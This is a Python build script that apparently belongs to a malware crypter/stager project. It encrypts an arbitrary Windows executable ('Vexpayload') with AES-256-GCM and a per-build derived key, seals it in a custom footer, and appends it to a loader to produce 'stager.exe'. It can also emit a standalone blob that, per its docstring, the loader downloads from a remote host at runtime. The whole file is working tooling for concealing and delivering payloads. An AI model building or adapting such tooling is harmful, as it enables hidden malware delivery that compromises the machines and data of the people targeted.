#!/usr/bin/env python3
"""Pack a payload onto the loader (footer v3, AES-256-GCM + HMAC).

    python tools/pack.py loader/x64/Release/xloader.exe \
                         x64/Release/Vexpayload.exe \
                         x64/Release/stager.exe \
                         [dist/stage.bin]

Result: stager.exe = loader + AES-256-GCM payload + footer v3
(magic VXPAY003, size, crc32 of plaintext, KDF salt, nonce, tag, HMAC-SHA256
over the ciphertext). `stage.bin` is the same blob without the loader, for
runtime staging (`xloader.exe --stage https://host/api/stage --token ...`).

The blob key is derived with HMAC-SHA256 from a per-build compiled secret
and the random salt in the footer, so no key material is stored in the clear
and every build uses a different key. The HMAC key is compiled into the
loader; a tampered stage blob is rejected before it is mapped.

Legacy footers (VXPAY001 XOR, VXPAY002 XOR) are stripped when repacking.
The loader rejects VXPAY002 unless built with VEX_ALLOW_LEGACY_STAGE=1.
"""

import hashlib
import hmac
import os
import re
import struct
import sys
import zlib

MAGIC = b"VXPAY003"
OLD_MAGIC = b"VXPAY002"
OLDEST_MAGIC = b"VXPAY001"
FOOTER = struct.Struct("<8sQI16s12s16s32s")  # 96 bytes
OLD_FOOTER = struct.Struct("<8sQI32s32s")    # v2: 84 bytes
OLDEST_FOOTER = struct.Struct("<8sQI32s")    # v1: 52 bytes

# Per-build key is generated by build.ps1 into loader/stage_key.h; the same
# 32 bytes are compiled into the loader and used to seal this blob. A missing
# header is a hard error: never fall back to a public constant.
HERE = os.path.dirname(os.path.abspath(__file__))
STAGE_KEY_HEADER = os.path.join(HERE, "..", "loader", "stage_key.h")


def load_stage_key() -> bytes:
    try:
        text = open(STAGE_KEY_HEADER, "r", encoding="utf-8").read()
    except OSError as exc:
        raise SystemExit(f"[!] missing {STAGE_KEY_HEADER}: run build.ps1 first") from exc
    vals = re.findall(r"0x([0-9a-fA-F]{2})", text)
    key = bytes(int(v, 16) for v in vals)
    if len(key) != 32:
        raise SystemExit("[!] stage_key.h must contain exactly 32 bytes")
    return key


HMAC_KEY = load_stage_key()

# Domain separation so the blob key is never the raw HMAC key.
KDF_LABEL = b"VEX-K3"


def strip_existing(blob: bytes) -> bytes:
    if len(blob) <= FOOTER.size:
        return blob
    magic, size, _crc, _salt, _nonce, _tag, _mac = FOOTER.unpack(
        blob[-FOOTER.size:])
    if magic == MAGIC and 0 < size <= len(blob) - FOOTER.size:
        print(f"[*] stripping previous payload block v3 ({size} bytes)")
        return blob[:len(blob) - FOOTER.size - size]
    if len(blob) > OLD_FOOTER.size:
        magic, size, _crc, _key, _mac = OLD_FOOTER.unpack(
            blob[-OLD_FOOTER.size:])
        if magic == OLD_MAGIC and 0 < size <= len(blob) - OLD_FOOTER.size:
            print(f"[*] stripping previous payload block v2 ({size} bytes)")
            return blob[:len(blob) - OLD_FOOTER.size - size]
    if len(blob) > OLDEST_FOOTER.size:
        magic, size, _crc, _key = OLDEST_FOOTER.unpack(
            blob[-OLDEST_FOOTER.size:])
        if magic == OLDEST_MAGIC and 0 < size <= len(blob) - OLDEST_FOOTER.size:
            print(f"[*] stripping previous payload block v1 ({size} bytes)")
            return blob[:len(blob) - OLDEST_FOOTER.size - size]
    return blob


def aes_gcm_encrypt(key: bytes, nonce: bytes, plaintext: bytes):
    from Crypto.Cipher import AES

    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce, mac_len=16)
    ct, tag = cipher.encrypt_and_digest(plaintext)
    return ct, tag


def main() -> int:
    if len(sys.argv) not in (4, 5):
        print(__doc__)
        return 2

    loader_path, payload_path, out_path = sys.argv[1:4]
    stage_path = sys.argv[4] if len(sys.argv) == 5 else ""

    with open(loader_path, "rb") as f:
        loader = strip_existing(f.read())
    with open(payload_path, "rb") as f:
        payload = f.read()

    if not loader:
        print("[!] empty loader")
        return 1
    if not payload:
        print("[!] empty payload")
        return 1
    if payload[:2] != b"MZ":
        print("[!] payload does not start with MZ")
        return 1

    salt = os.urandom(16)
    nonce = os.urandom(12)
    key = hmac.new(HMAC_KEY, KDF_LABEL + salt, hashlib.sha256).digest()

    ct, tag = aes_gcm_encrypt(key, nonce, payload)
    crc = zlib.crc32(payload) & 0xFFFFFFFF
    mac = hmac.new(HMAC_KEY, ct, hashlib.sha256).digest()

    footer = FOOTER.pack(MAGIC, len(ct), crc, salt, nonce, tag, mac)
    out = loader + ct + footer

    with open(out_path, "wb") as f:
        f.write(out)

    print(f"[+] loader   {len(loader):>9,} bytes")
    print(f"[+] payload  {len(payload):>9,} bytes  crc32 {crc:08x}")
    print(f"[+] sealed   aes-256-gcm  tag {tag.hex()[:16]}...  hmac {mac.hex()[:16]}...")
    print(f"[+] stager   {len(out):>9,} bytes -> {out_path}")

    if stage_path:
        with open(stage_path, "wb") as f:
            f.write(ct + footer)
        print(f"[+] stage    {len(ct) + len(footer):>9,} bytes -> {stage_path}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
